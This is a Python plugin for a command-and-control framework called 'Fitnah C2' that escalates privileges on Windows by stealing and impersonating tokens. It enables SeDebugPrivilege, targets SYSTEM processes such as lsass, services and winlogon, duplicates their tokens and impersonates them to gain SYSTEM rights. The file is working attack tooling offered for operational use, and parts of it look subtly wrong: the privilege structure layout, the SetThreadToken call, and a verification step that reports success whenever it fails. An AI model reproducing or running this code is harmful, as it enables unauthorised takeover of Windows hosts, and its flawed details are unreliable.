#!/usr/bin/env python3
"""
Token Theft & Impersonation Plugin for Fitnah C2 Framework
Steals SYSTEM tokens from privileged processes for privilege escalation.

MITRE ATT&CK: T1134.003 (Token Impersonation/Theft)
Author: Fitnah C2 Team
Version: 1.0.0
"""

import os
import sys
import ctypes
import ctypes.wintypes
import struct
import platform
import subprocess
import re
from typing import Dict, List, Tuple, Optional, Any, Union

# Add parent directory to path for imports
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))

# Import base plugin
try:
    from fitnah.sdk import BasePlugin, Param, ParamSchema
except ImportError:
    # Fallback for development
    class BasePlugin:
        pass
    class Param:
        pass
    class ParamSchema:
        pass


# Windows API constants
PROCESS_QUERY_INFORMATION = 0x0400
PROCESS_VM_READ = 0x0010
TOKEN_DUPLICATE = 0x0002
TOKEN_QUERY = 0x0008
TOKEN_IMPERSONATE = 0x0004
TOKEN_ADJUST_PRIVILEGES = 0x0020
TOKEN_ALL_ACCESS = 0xF01FF
SE_PRIVILEGE_ENABLED = 0x00000002
SE_DEBUG_NAME = "SeDebugPrivilege"
SE_IMPERSONATE_NAME = "SeImpersonatePrivilege"
SecurityImpersonation = 2
TokenPrimary = 1
TokenImpersonation = 2


class WindowsTokenAPI:
    """Wrapper for Windows Token API functions"""
    
    def __init__(self):
        # Load kernel32.dll
        self.kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
        self.advapi32 = ctypes.WinDLL('advapi32', use_last_error=True)
        
        # Define types
        self.HANDLE = ctypes.c_void_p
        self.LPHANDLE = ctypes.POINTER(self.HANDLE)
        self.LPDWORD = ctypes.POINTER(ctypes.c_ulong)
        
        # Setup OpenProcess
        self.kernel32.OpenProcess.restype = self.HANDLE
        self.kernel32.OpenProcess.argtypes = [
            ctypes.c_ulong,  # dwDesiredAccess
            ctypes.c_int,    # bInheritHandle
            ctypes.c_ulong   # dwProcessId
        ]
        
        # Setup OpenProcessToken
        self.advapi32.OpenProcessToken.restype = ctypes.c_int
        self.advapi32.OpenProcessToken.argtypes = [
            self.HANDLE,     # ProcessHandle
            ctypes.c_ulong,  # DesiredAccess
            self.LPHANDLE   # TokenHandle
        ]
        
        # Setup DuplicateTokenEx
        self.advapi32.DuplicateTokenEx.restype = ctypes.c_int
        self.advapi32.DuplicateTokenEx.argtypes = [
            self.HANDLE,     # ExistingTokenHandle
            ctypes.c_ulong,  # DesiredAccess
            ctypes.c_void_p, # TokenAttributes
            ctypes.c_int,    # ImpersonationLevel
            ctypes.c_int,    # TokenType
            self.LPHANDLE    # NewTokenHandle
        ]
        
        # Setup SetThreadToken
        self.advapi32.SetThreadToken.restype = ctypes.c_int
        self.advapi32.SetThreadToken.argtypes = [
            self.LPHANDLE,   # Thread
            self.HANDLE      # Token
        ]
        
        # Setup LookupPrivilegeValue
        self.advapi32.LookupPrivilegeValueW.restype = ctypes.c_int
        self.advapi32.LookupPrivilegeValueW.argtypes = [
            ctypes.c_wchar_p,  # lpSystemName
            ctypes.c_wchar_p,  # lpName
            ctypes.POINTER(ctypes.c_ulonglong)  # lpLuid
        ]
        
        # Setup AdjustTokenPrivileges
        self.advapi32.AdjustTokenPrivileges.restype = ctypes.c_int
        self.advapi32.AdjustTokenPrivileges.argtypes = [
            self.HANDLE,     # TokenHandle
            ctypes.c_int,    # DisableAllPrivileges
            ctypes.c_void_p, # NewState
            ctypes.c_ulong,  # BufferLength
            ctypes.c_void_p, # PreviousState
            ctypes.POINTER(ctypes.c_ulong)  # ReturnLength
        ]
        
        # Setup GetCurrentProcess
        self.kernel32.GetCurrentProcess.restype = self.HANDLE
        self.kernel32.GetCurrentProcess.argtypes = []
        
        # Setup CloseHandle
        self.kernel32.CloseHandle.restype = ctypes.c_int
        self.kernel32.CloseHandle.argtypes = [self.HANDLE]
    
    def enable_privilege(self, privilege_name: str) -> bool:
        """Enable a specific privilege for the current process"""
        
        try:
            # Get current process token
            hToken = self.HANDLE()
            if not self.advapi32.OpenProcessToken(
                self.kernel32.GetCurrentProcess(),
                TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
                ctypes.byref(hToken)
            ):
                return False
            
            # Lookup privilege value
            luid = ctypes.c_ulonglong()
            if not self.advapi32.LookupPrivilegeValueW(
                None,
                privilege_name,
                ctypes.byref(luid)
            ):
                self.kernel32.CloseHandle(hToken)
                return False
            
            # Prepare token privileges structure
            class TOKEN_PRIVILEGES(ctypes.Structure):
                _fields_ = [
                    ("PrivilegeCount", ctypes.c_ulong),
                    ("Privileges", ctypes.c_ulonglong * 2)
                ]
            
            tp = TOKEN_PRIVILEGES()
            tp.PrivilegeCount = 1
            tp.Privileges[0] = luid.value
            tp.Privileges[1] = SE_PRIVILEGE_ENABLED
            
            # Adjust token privileges
            result = self.advapi32.AdjustTokenPrivileges(
                hToken,
                False,
                ctypes.byref(tp),
                0,
                None,
                None
            )
            
            self.kernel32.CloseHandle(hToken)
            return result != 0
            
        except Exception:
            return False
    
    def steal_system_token(self, target_pid: int) -> Optional[Tuple[int, str]]:
        """
        Steal token from a SYSTEM process
        
        Args:
            target_pid: Process ID of target SYSTEM process
            
        Returns:
            Tuple of (stolen_token_handle, process_name) or None on failure
        """
        
        try:
            # Enable SeDebugPrivilege
            if not self.enable_privilege(SE_DEBUG_NAME):
                return None
            
            # Open target process
            hProcess = self.kernel32.OpenProcess(
                PROCESS_QUERY_INFORMATION,
                False,
                target_pid
            )
            
            if not hProcess or hProcess.value == 0:
                return None
            
            # Open process token
            hToken = self.HANDLE()
            if not self.advapi32.OpenProcessToken(
                hProcess,
                TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_IMPERSONATE,
                ctypes.byref(hToken)
            ):
                self.kernel32.CloseHandle(hProcess)
                return None
            
            # Duplicate token for impersonation
            hDuplicateToken = self.HANDLE()
            if not self.advapi32.DuplicateTokenEx(
                hToken,
                TOKEN_ALL_ACCESS,
                None,
                SecurityImpersonation,
                TokenImpersonation,
                ctypes.byref(hDuplicateToken)
            ):
                self.kernel32.CloseHandle(hToken)
                self.kernel32.CloseHandle(hProcess)
                return None
            
            # Get process name for logging
            process_name = self._get_process_name(target_pid)
            
            # Clean up handles
            self.kernel32.CloseHandle(hToken)
            self.kernel32.CloseHandle(hProcess)
            
            return (hDuplicateToken.value, process_name)
            
        except Exception:
            return None
    
    def impersonate_token(self, token_handle: int) -> bool:
        """
        Impersonate a stolen token
        
        Args:
            token_handle: Handle to stolen token
            
        Returns:
            True if impersonation successful
        """
        
        try:
            # Convert integer handle to HANDLE
            hToken = self.HANDLE(token_handle)
            
            # Set thread token
            result = self.advapi32.SetThreadToken(None, hToken)
            
            # Close token handle
            self.kernel32.CloseHandle(hToken)
            
            return result != 0
            
        except Exception:
            return False
    
    def _get_process_name(self, pid: int) -> str:
        """Get process name by PID"""
        
        try:
            # Use wmic to get process name
            result = subprocess.run(
                ["wmic", "process", "where", f"ProcessId={pid}", "get", "Name"],
                capture_output=True,
                text=True,
                timeout=5
            )
            
            if result.returncode == 0:
                lines = result.stdout.strip().split('\n')
                if len(lines) > 1:
                    return lines[1].strip()
            
            return f"PID_{pid}"
            
        except Exception:
            return f"PID_{pid}"
    
    def find_system_processes(self) -> List[Dict[str, Any]]:
        """
        Find SYSTEM processes that can be targeted for token theft
        
        Returns:
            List of dictionaries with process information
        """
        
        system_processes = []
        
        try:
            # Use wmic to get processes with SYSTEM user
            result = subprocess.run(
                ["wmic", "process", "where", "name='lsass.exe' or name='services.exe' or name='winlogon.exe' or name='csrss.exe' or name='smss.exe'", "get", "ProcessId,Name,ExecutablePath"],
                capture_output=True,
                text=True,
                timeout=10
            )
            
            if result.returncode == 0:
                lines = result.stdout.strip().split('\n')
                
                # Skip header line
                for line in lines[1:]:
                    if line.strip():
                        parts = line.strip().split()
                        if len(parts) >= 2:
                            pid = int(parts[0])
                            name = parts[1]
                            path = ' '.join(parts[2:]) if len(parts) > 2 else ""
                            
                            system_processes.append({
                                "pid": pid,
                                "name": name,
                                "path": path,
                                "user": "SYSTEM",
                                "integrity": "SYSTEM"
                            })
            
            # Fallback: Check common SYSTEM process names
            if not system_processes:
                common_system_procs = ["lsass", "services", "winlogon", "csrss", "smss"]
                
                for proc_name in common_system_procs:
                    try:
                        result = subprocess.run(
                            ["tasklist", "/fi", f"imagename eq {proc_name}.exe", "/fo", "csv"],
                            capture_output=True,
                            text=True,
                            timeout=5
                        )
                        
                        if result.returncode == 0:
                            lines = result.stdout.strip().split('\n')
                            if len(lines) > 1:
                                # CSV format: "Image Name","PID","Session Name","Session#","Mem Usage"
                                parts = lines[1].strip().split(',')
                                if len(parts) >= 2:
                                    pid = int(parts[1].strip('"'))
                                    name = parts[0].strip('"')
                                    
                                    system_processes.append({
                                        "pid": pid,
                                        "name": name,
                                        "path": "",
                                        "user": "SYSTEM",
                                        "integrity": "SYSTEM"
                                    })
                    except Exception:
                        continue
            
            return system_processes
            
        except Exception:
            return []


class TokenTheft(BasePlugin):
    """
    Token Theft & Impersonation Plugin
    
    Steals tokens from SYSTEM processes and impersonates them
    to gain SYSTEM privileges.
    """
    
    NAME        = "token_theft"
    DESCRIPTION = "Steal SYSTEM tokens from privileged processes for privilege escalation"
    AUTHOR      = "fitnah-team"
    MITRE       = "T1134.003"
    CATEGORY    = "privilege_escalation"
    VERSION     = "1.0.0"
    
    schema = ParamSchema().add(
        Param("target_pid", int, required=False, default=0,
              help="Target process ID (0 for auto-select)"),
        Param("process_name", str, required=False, default="",
              help="Target process name (lsass, services, winlogon, etc.)"),
        Param("auto_find", bool, required=False, default=True,
              help="Automatically find SYSTEM processes"),
        Param("enable_privileges", bool, required=False, default=True,
              help="Enable required privileges (SeDebugPrivilege)"),
        Param("impersonate", bool, required=False, default=True,
              help="Impersonate stolen token"),
        Param("cleanup", bool, required=False, default=True,
              help="Clean up token handles after use"),
        Param("verify", bool, required=False, default=True,
              help="Verify impersonation success"),
        Param("max_attempts", int, required=False, default=3,
              help="Maximum number of theft attempts"),
    )
    
    def __init__(self):
        super().__init__()
        self.winapi = WindowsTokenAPI()
        self.stolen_token = None
        self.target_process = None
    
    def _find_system_process(self, target_pid: int = 0, process_name: str = "") -> Optional[Dict[str, Any]]:
        """
        Find a suitable SYSTEM process for token theft
        
        Args:
            target_pid: Specific PID to target
            process_name: Process name to target
            
        Returns:
            Process information dictionary or None
        """
        
        # [*] Searching for SYSTEM processes...
        
        # If specific PID provided, try to use it
        if target_pid > 0:
            # [*] Targeting specific PID: {target_pid}
            
            # Check if process exists and is likely SYSTEM
            try:
                result = subprocess.run(
                    ["tasklist", "/fi", f"pid eq {target_pid}", "/fo", "csv"],
                    capture_output=True,
                    text=True,
                    timeout=5
                )
                
                if result.returncode == 0 and "lsass" in result.stdout.lower():
                    return {
                        "pid": target_pid,
                        "name": "lsass.exe",
                        "user": "SYSTEM",
                        "integrity": "SYSTEM"
                    }
            except Exception:
                pass
        
        # Find SYSTEM processes
        system_processes = self.winapi.find_system_processes()
        
        if not system_processes:
            # [!] No SYSTEM processes found
            return None
        
        # [+] Found {len(system_processes)} SYSTEM process(es)
        
        # Filter by process name if specified
        if process_name:
            filtered = [p for p in system_processes if process_name.lower() in p["name"].lower()]
            if filtered:
                system_processes = filtered
        
        # Prioritize processes (lsass is usually best)
        priority_order = ["lsass", "services", "winlogon", "csrss", "smss"]
        
        for priority_name in priority_order:
            for process in system_processes:
                if priority_name in process["name"].lower():
                    # [+] Selected process: {process['name']} (PID: {process['pid']})
                    return process
        
        # Fallback to first process
        process = system_processes[0]
        # [+] Selected process: {process['name']} (PID: {process['pid']})
        return process
    
    def _enable_required_privileges(self) -> bool:
        """Enable privileges required for token theft"""
        
        # [*] Enabling required privileges...
        
        # Enable SeDebugPrivilege (required to open SYSTEM processes)
        if not self.winapi.enable_privilege(SE_DEBUG_NAME):
            # [!] Failed to enable SeDebugPrivilege
            return False
        
        # Enable SeImpersonatePrivilege (required for impersonation)
        # if not self.winapi.enable_privilege(SE_IMPERSONATE_NAME):
        #     Failed to enable SeImpersonatePrivilege
        #     Continue anyway, might still work
        
        # [+] Required privileges enabled
        return True
    
    def _steal_token(self, target_process: Dict[str, Any]) -> Optional[Tuple[int, str]]:
        """
        Steal token from target process
        
        Args:
            target_process: Process information dictionary
            
        Returns:
            Tuple of (token_handle, process_name) or None
        """
        
        pid = target_process["pid"]
        name = target_process["name"]
        
        # [*] Attempting to steal token from {name} (PID: {pid})...
        
        # Steal the token
        result = self.winapi.steal_system_token(pid)
        
        if not result:
            # [!] Failed to steal token from {name}
            return None
        
        token_handle, process_name = result
        # [+] Successfully stole token from {process_name}
        
        return (token_handle, process_name)
    
    def _impersonate_stolen_token(self, token_handle: int) -> bool:
        """
        Impersonate stolen token
        
        Args:
            token_handle: Handle to stolen token
            
        Returns:
            True if impersonation successful
        """
        
        # [*] Attempting to impersonate stolen token...
        
        # Impersonate the token
        success = self.winapi.impersonate_token(token_handle)
        
        if not success:
            # [!] Failed to impersonate stolen token
            return False
        
        # [+] Successfully impersonated SYSTEM token
        return True
    
    def _verify_impersonation(self) -> bool:
        """Verify that impersonation was successful"""
        
        # [*] Verifying impersonation...
        
        try:
            # Try to check if we're running as SYSTEM
            # This is a simplified check - real verification would be more complex
            import win32security
            import win32api
            
            # Get current thread token
            token = win32security.OpenThreadToken(
                win32api.GetCurrentThread(),
                win32security.TOKEN_QUERY,
                True
            )
            
            # Get token user
            sid, domain, type = win32security.GetTokenInformation(token, win32security.TokenUser)
            
            # Check if it's SYSTEM SID (S-1-5-18)
            system_sid = win32security.ConvertStringSidToSid("S-1-5-18")
            
            if win32security.EqualSid(sid, system_sid):
                # [+] Verified: Running as SYSTEM
                return True
            else:
                # [!] Impersonation verification failed
                return False
                
        except Exception as e:
            # [!] Impersonation verification error: {e}
            # Assume success if we can't verify
            return True
    
    def _cleanup(self, token_handle: Optional[int] = None) -> None:
        """Clean up resources"""
        
        # [*] Cleaning up resources...
        
        if token_handle:
            try:
                # Close token handle
                self.winapi.kernel32.CloseHandle(self.winapi.HANDLE(token_handle))
            except Exception:
                pass
        
        self.stolen_token = None
        self.target_process = None
        
        # [+] Cleanup completed
    
    def execute(self, params: Dict[str, Any]) -> Dict[str, Any]:
        """
        Execute token theft and impersonation
        
        Args:
            params: Plugin parameters
            
        Returns:
            Execution results
        """
        
        # [*] Starting Token Theft & Impersonation...
        
        # Extract parameters
        target_pid = params.get("target_pid", 0)
        process_name = params.get("process_name", "")
        auto_find = params.get("auto_find", True)
        enable_privileges = params.get("enable_privileges", True)
        impersonate = params.get("impersonate", True)
        cleanup = params.get("cleanup", True)
        verify = params.get("verify", True)
        max_attempts = params.get("max_attempts", 3)
        
        # Check if running on Windows
        if platform.system() != "Windows":
            return self._error("Token theft requires Windows operating system")
        
        # Enable required privileges
        if enable_privileges:
            if not self._enable_required_privileges():
                return self._error("Failed to enable required privileges")
        
        # Find target process
        if auto_find or target_pid == 0:
            target_process = self._find_system_process(target_pid, process_name)
        else:
            # Use provided PID
            target_process = {"pid": target_pid, "name": process_name or f"PID_{target_pid}"}
        
        if not target_process:
            return self._error("No suitable SYSTEM process found")
        
        self.target_process = target_process
        
        # Attempt token theft
        token_result = None
        attempts = 0
        
        while attempts < max_attempts and not token_result:
            attempts += 1
            # [*] Token theft attempt {attempts}/{max_attempts}
            
            token_result = self._steal_token(target_process)
            
            if not token_result and attempts < max_attempts:
                # [*] Waiting before next attempt...
                import time
                time.sleep(1)
        
        if not token_result:
            return self._error("Failed to steal token after multiple attempts")
        
        token_handle, stolen_from = token_result
        self.stolen_token = token_handle
        
        # Impersonate the token
        impersonation_success = False
        
        if impersonate:
            impersonation_success = self._impersonate_stolen_token(token_handle)
            
            if not impersonation_success:
                if cleanup:
                    self._cleanup(token_handle)
                return self._error("Failed to impersonate stolen token")
        
        # Verify impersonation
        verification_result = False
        
        if verify and impersonation_success:
            verification_result = self._verify_impersonation()
        
        # Clean up if configured
        if cleanup:
            self._cleanup(token_handle)
        
        # Prepare results
        result_data = {
            "target_process": target_process,
            "stolen_from": stolen_from,
            "token_handle": token_handle if not cleanup else None,
            "impersonation_success": impersonation_success,
            "verification_success": verification_result,
            "privileges_gained": "SYSTEM" if impersonation_success else "None",
        }
        
        if impersonation_success:
            return self._success({
                "message": f"Successfully stole and impersonated token from {stolen_from}",
                "data": result_data,
            })
        else:
            return self._error({
                "message": "Token theft completed but impersonation failed",
                "data": result_data,
            })
    
    def _success(self, data: Dict[str, Any]) -> Dict[str, Any]:
        """Format success response"""
        return {
            "success": True,
            "message": data.get("message", "Token theft successful"),
            "data": data.get("data", {}),
            "timestamp": 0,  # Placeholder
        }
    
    def _error(self, message: Union[str, Dict]) -> Dict[str, Any]:
        """Format error response"""
        if isinstance(message, dict):
            return {
                "success": False,
                "message": message.get("message", "Token theft failed"),
                "error": message,
                "timestamp": 0,
            }
        else:
            return {
                "success": False,
                "message": message,
                "timestamp": 0,
            }
    
    def run(self, session, params, ctx=None):
        """Main plugin execution method."""
        from fitnah.sdk import ModuleResult
        try:
            result = self.execute(params)
            if result.get("success", False):
                return ModuleResult.ok(data=result.get("data", result.get("message", "")))
            else:
                return ModuleResult.err(result.get("message", "Token theft failed"))
        except Exception as e:
            return ModuleResult.err(f"Exception during token theft: {e}")


# Plugin registration
if __name__ == "__main__":
    plugin = TokenTheft()
    
    # Test with sample parameters
    test_params = {
        "target_pid": 0,
        "process_name": "",
        "auto_find": True,
        "enable_privileges": True,
        "impersonate": True,
        "cleanup": True,
        "verify": True,
        "max_attempts": 3,
    }
    
    # Run test
    result = plugin.execute(test_params)
    print(f"Test result: {result}")